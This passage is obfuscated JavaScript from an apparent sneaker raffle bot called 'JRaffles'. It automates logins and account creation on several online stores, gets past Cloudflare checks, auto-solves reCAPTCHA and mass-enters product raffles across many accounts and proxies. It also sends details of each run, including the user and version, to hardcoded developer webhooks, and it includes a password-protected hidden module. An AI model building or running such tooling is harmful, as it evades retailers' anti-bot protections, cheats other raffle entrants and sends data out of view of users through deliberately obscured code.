                'username': '' + _0x591196[0x2],
                'password': '' + _0x591196[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x27a909['goto']('https://www.fenom.com/en/authentication'), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x482138['send']('Browser.setWindowBounds', {
                'windowId': _0x166fb6,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x1f4682(0x1f40);
            try {
                await _0x27a909['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x1f4682(0x1388), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Logging\x20in'), await _0x27a909['type']('input[name=\x22email\x22]', '' + _0x36d56d[_0x385b14]['Email']), await _0x1f4682(0x1f4), await _0x27a909['type']('input[name=\x22password\x22]', '' + _0x36d56d[_0x385b14]['Password']), await _0x1f4682(0x258), await _0x27a909['$eval']('#login-form', _0xcf6b40 => _0xcf6b40['submit']()), await _0x27a909['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1f4682(0x1f4), await _0x27a909['goto']('' + _0x36d56d[_0x385b14]['Url']), await _0x27a909['waitForSelector']('#group_2'), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x36d56d[_0x385b14]['Size']);
            if (_0x36d56d[_0x385b14]['Size'] != 'RANDOM') {
                var _0x5377e5 = '\x20' + _0x36d56d[_0x385b14]['Size'] + '\x20';
                const _0xcaa758 = await _0x27a909['$x']('//span[contains(text(),\x20' + _0x5377e5 + ')]');
                await _0xcaa758[0x0]['click']();
            } else {
                const _0x2e14d5 = await _0x27a909['$$']('#group_2\x20>\x20li');
                var _0x347ed3 = Math['round'](Math['random']() * (_0x2e14d5['length'] - 0x1));
                await _0x2e14d5[_0x347ed3]['click']();
            }
            await _0x1f4682(0x258), await _0x27a909['type']('#instagram-account', '' + _0x36d56d[_0x385b14]['Follower']), await _0x1f4682(0x28a), await _0x27a909['click']('#book-btn'), await _0x1f4682(0xbb8), await _0x27a909['waitForSelector']('#recaptcha-container'), await _0x1f4682(0x1f4), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20' + _0xeca352['cyan']('Solving\x20Captcha')), await _0x27a909['solveRecaptchas'](), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1f4682(0x3e8), await _0x27a909['click']('#book-btn-for-sure'), await _0x27a909['click']('#book-btn-for-sure'), await _0x1f4682(0x3e8);
            const _0x33f63e = await _0x27a909['$eval']('.reservation-popup\x20>\x20.title', _0xef4c32 => {
                return _0xef4c32['innerHTML'];
            });
            if (_0x33f63e) {
                console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x371aa5 = await _0x2221dc(_0x36d56d[_0x385b14], _0x4a6d44, 'dev', ![]), _0x23d1f5 = await _0x2221dc(_0x36d56d[_0x385b14], _0x4a6d44, 'pub', ![]);
                const _0x7b0cf0 = {
                    'succesDEVMSG': { 'embeds': [_0x371aa5] },
                    'succesPUBMSG': { 'embeds': [_0x23d1f5] }
                };
                try {
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x7b0cf0['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x7b0cf0['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x146b83, _0x7b0cf0['succesPUBMSG']);
                } catch (_0x15801d) {
                    console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x15801d));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x154cab) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Task\x20' + (_0x385b14 + 0x1) + '\x20:\x20' + _0x154cab)), _0x504a07 = '' + _0x154cab;
            var _0x519efd = await _0x2221dc(_0x36d56d[_0x385b14], _0x4a6d44, 'dev', !![], _0x504a07), _0x371aa5 = await _0x2221dc(_0x36d56d[_0x385b14], _0x4a6d44, 'dev', ![]), _0x23d1f5 = await _0x2221dc(_0x36d56d[_0x385b14], _0x4a6d44, 'pub', ![]);
            const _0x117a5a = {
                'succesDEVMSG': { 'embeds': [_0x371aa5] },
                'succesPUBMSG': { 'embeds': [_0x23d1f5] }
            };
            _0x117a5a['errorDEV'] = { 'embeds': [_0x519efd] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x117a5a['errorDEV']), await _0x10557a(_0x3df8e6, _0x117a5a['errorDEV']);
        } finally {
            _0x35c672['close'](), console['log'](_0x3a3ee9() + '\x20[' + _0x4a6d44['name'] + ']\x20Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x362145() {
    await _0x3fb0dd(), console['clear']();
    if (_0x49eea2 != 'devkey') {
        let _0x446e94 = await _0x500ee3['autoUpdate']();
        if (_0x446e94 === 'yes')
            return _0x54f98b('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2654a4 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1f4682(0x2710);
        ;
    }
    await _0x4477ba(_0x2654a4);
    if (_0x55763a === ![])
        return console['log']('Closing\x20Browser'), await _0x1f4682(0xbb8);
    else
        try {
            var _0x5c9f41 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1b651e
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x49eea2
                    }
                ]
            }];
            const _0x524606 = { 'embeds': _0x5c9f41 };
            var _0x30a4e0 = await _0x2221dc(null, null, 'open', ![]);
            const _0x479e1c = { 'openDEVMSG': { 'embeds': [_0x30a4e0] } };
            await _0x10557a(_0xcb3fb, _0x479e1c['openDEVMSG']);
            async function _0x13f796() {
                _0x4dc5fe('JRaffles\x20' + _0x49eea2), console['clear'](), console['log']('Welcome\x20to\x20' + _0xeca352['cyan']('JRaffles();') + '\x20' + _0x49eea2), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x2f9180 = 0x0; _0x2f9180 < _0x1b0085['length'] - 0x3; _0x2f9180++) {
                    if (_0x1b0085[_0x2f9180]['name'] === 'Reload\x20Settings' || _0x1b0085[_0x2f9180]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x2f9180 + ')\x20[' + _0x1b0085[_0x2f9180]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1b0085['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1b0085['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1b0085['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x31a93b();
                if (taskModule > _0x1b0085['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1f4682(0x3e8), _0x13f796();
                if (_0x1b0085[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                    var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x426008 = await _0x4d53e1(), _0x25fbe0 = await _0x196a62();
                        await _0xc83b3e(_0x25fbe0, _0x426008, _0xf13013);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x426008 = await _0x4d53e1(), _0x25fbe0 = await _0x196a62();
                            await _0x260de2(_0x25fbe0, _0x426008, _0xf13013);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x426008 = await _0x4d53e1(), _0x45e236 = await _0x5654cd(), _0x32d0f9 = _0x45e236['split'](';');
                                await _0x1e41a0(_0x32d0f9, _0x426008, _0xf13013);
                            }
                        }
                    }
                    return _0x13f796();
                }
                if (_0x1b0085[taskModule]['name'] == 'FENOM') {
                    taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                    var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x426008 = await _0x4d53e1(), _0x117572 = await _0x196a62();
                        await _0x2d6f71(_0x117572, _0x426008, _0xf13013);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x426008 = await _0x4d53e1(), _0x117572 = await _0x196a62();
                            await _0x134e28(_0x117572, _0x426008, _0xf13013);
                        }
                    }
                    return _0x13f796();
                }
                if (_0x1b0085[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                    var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x426008 = await _0x4d53e1(), _0xf74792 = await _0x196a62();
                    if (_0xf74792[0x0]['Url'] == '' || _0xf74792[0x0]['Url'] == undefined) {
                        await _0x4b58a2(_0x426008);
                        var _0x1e89ea = await _0xce8d75();
                        return await afewFunction('' + _0x18b0e6[_0x1e89ea], 'nor', _0xf13013, _0xf74792, _0x426008), _0x13f796();
                    }
                    return await afewFunction(_0xf74792[0x0]['Url'], 'nor', _0xf13013, _0xf74792, _0x426008), _0x13f796();
                } else {
                    if (_0x1b0085[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                        var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x426008 = await _0x4d53e1(), _0x2e3e57 = await _0x196a62();
                            console['log']('Starting\x20' + _0x2e3e57['length'] + '\x20MAHA\x20Tasks');
                            for (var _0xa2a2e7 = 0x0; _0xa2a2e7 < _0x2e3e57['length']; _0xa2a2e7++) {
                                console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x1bfb71(_0xa2a2e7, 'nor', _0xf13013, _0x2e3e57, _0x426008), console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Sleeping\x20for\x20' + _0x202e3d['MahaDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['MahaDelay']);
                                } catch (_0x3e190f) {
                                    console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Error\x20' + _0x3e190f));
                                }
                            }
                            ;
                            return _0x13f796();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x426008 = await _0x4d53e1();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x45e236 = await _0x5654cd(), _0x32d0f9 = _0x45e236['split'](';'), console['log'](_0x32d0f9['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0xa2a2e7 = 0x0; _0xa2a2e7 < _0x32d0f9['length']; _0xa2a2e7++) {
                                    _0xf13013['url'] = _0x32d0f9[_0xa2a2e7], console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x1bfb71(_0xa2a2e7, 'ver', _0xf13013, _0x2e3e57, _0x426008), console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Sleeping\x20for\x20' + _0x202e3d['verificationDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['verificationDelay']);
                                    } catch (_0x4f7e80) {
                                        console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Error\x20' + _0x4f7e80));
                                    }
                                }
                                ;
                                return _0x13f796();
                            }
                        }
                    } else {
                        if (_0x1b0085[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                            var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction], _0x426008 = await _0x4d53e1(), _0x5d192c = await _0x196a62();
                            return await _0x29d527(_0x5d192c, _0x426008, _0xf13013), await _0x1f4682(0x1388), _0x13f796();
                        } else {
                            if (_0x1b0085[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x426008 = await _0x4d53e1(), _0x2e4734 = await _0x196a62();
                                    console['log']('Starting\x20' + _0xeca352['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0xa2a2e7 = 0x0; _0xa2a2e7 < _0x2e4734['length']; _0xa2a2e7++) {
                                        console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x123f3e(_0xa2a2e7, 'nor', _0xf13013, _0x2e4734, _0x426008);
                                        } catch (_0x1558e3) {
                                            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Task\x20failed\x20' + _0x1558e3));
                                        }
                                        console['log'](_0x3a3ee9() + '\x20[' + _0xf13013['name'] + ']\x20Sleeping\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
                                    }
                                    return _0x13f796();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x426008 = await _0x4d53e1();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x45e236 = await _0x5654cd(), _0x32d0f9 = _0x45e236['split'](';'), console['log'](_0x32d0f9['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0xa2a2e7 = 0x0; _0xa2a2e7 < _0x32d0f9['length']; _0xa2a2e7++) {
                                            try {
                                                _0xf13013['url'] = _0x32d0f9[_0xa2a2e7], console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0xa2a2e7 + 0x1) + ':\x20Getting\x20Session'), await _0x123f3e(_0xa2a2e7, 'ver', _0xf13013, null, _0x426008), console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x202e3d['verificationDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['verificationDelay']);
                                            } catch (_0x3978dc) {
                                                console['log'](_0x3978dc), await _0x1f4682(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x13f796();
                                    }
                                }
                                ;
                            } else {
                                if (_0x1b0085[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                    var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0xf7182c('https://bouncewear.com/nl/account/register', _0xf13013);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1b0085[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                        var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x426008 = await _0x4d53e1(), _0x28dc1f = await _0x196a62();
                                            return await _0xa11f65('https://patta.nl/account/register', _0xf13013, _0x28dc1f, _0x426008), _0x13f796();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x426008 = await _0x4d53e1(), _0x28dc1f = await _0x196a62();
                                                return await _0x493f69('', _0xf13013, _0x28dc1f, _0x426008), _0x13f796();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1b0085[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                            var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x426008 = await _0x4d53e1(), _0x17cda8 = await _0x196a62();
                                                return await _0x17a79d('https://slamjam.nl/account/register', _0xf13013, _0x17cda8, _0x426008), _0x13f796();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x426008 = await _0x4d53e1(), _0x17cda8 = await _0x196a62();
                                                    return await _0x1d9621('', _0xf13013, _0x17cda8, _0x426008), _0x13f796();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1b0085[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                                var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x426008 = await _0x4d53e1(), _0x2c5673 = await _0x196a62();
                                                    return await _0x37f61f('https://www.kickz.com/nl/login/', _0xf13013, _0x2c5673, _0x426008), _0x13f796();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x426008 = await _0x4d53e1(), _0x2c5673 = await _0x196a62();
                                                        return await _0x5388e4(_0xf13013, _0x2c5673, _0x426008), _0x13f796();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1b0085[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x56512e(_0x1b0085[taskModule]['modules']);
                                                    var _0xf13013 = _0x1b0085[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x426008 = await _0x4d53e1(), _0x55cf30 = await _0x196a62();
                                                        return await _0xf95062(_0xf13013, _0x55cf30, _0x426008), _0x13f796();
                                                    }
                                                } else {
                                                    if (_0x1b0085[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x1f4682(0x3e8), _0x13f796();
                                                    else {
                                                        if (_0x1b0085[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x523d8f = _0x1b0085[taskModule]['name'], _0x426008 = await _0x4d53e1();
                                                            const _0xc6e408 = await _0x5654cd();
                                                            var _0x32d0f9 = _0xc6e408['split'](';');
                                                            await _0x3946c7(_0x32d0f9, _0x523d8f, _0x426008);
                                                        } else {
                                                            if (_0x1b0085[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x4f57ce = 0x0;
                                                                for (const _0x4ef243 in _0x202e3d) {
                                                                    console['log']('(' + _0x4f57ce + ')\x20' + _0x4ef243 + '\x20:\x20' + _0x202e3d[_0x4ef243]), _0x4f57ce++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x4f57ce + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0xd8af6c = await _0x2bcce7();
                                                                if (_0xd8af6c == _0x4f57ce)
                                                                    return _0x13f796();
                                                                console['clear'];
                                                                var _0x48f106 = 0x0;
                                                                for (var _0x1fa180 in _0x202e3d) {
                                                                    if (_0xd8af6c == _0x48f106) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1fa180 + '\x20:'), _0x202e3d[_0x1fa180] = await _0x3ddf72(), _0x1da89f['writeFileSync']('../settings.json', JSON['stringify'](_0x202e3d));
                                                                        break;
                                                                    } else
                                                                        _0x48f106++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x1f4682(0xbb8), _0x13f796();
                                                            } else {
                                                                if (_0x1b0085[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x3fb0dd(), _0x13f796();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x1b0085[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x373c6a = await _0x559a03();
                                                                        _0x373c6a == 'ModuleVoorDeBoys' ? (await _0x4b58a2(), await _0xce8d75(), await afewFunction(_0x18b0e6[_0x1e89ea], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1f4682(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x13f796();
        } catch (_0x3a458d) {
            return console['log'](_0x3a458d), await _0x1f4682(0x3a98);
        }
}
;
_0x4dc5fe('JRaffles\x20' + _0x49eea2), _0x3fb0dd();
try {
    _0x362145();
} catch (_0x150dc5) {
    var _0x2759ae = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x1b651e
            },
            {
                'name': 'Version',
                'value': '' + _0x49eea2
            },
            {
                'name': 'Error',
                'value': '' + _0x150dc5
            }
        ]
    }];
    const _0x5f35d5 = { 'embeds': _0x2759ae };
    _0x10557a(_0x3df8e6, _0x5f35d5);
}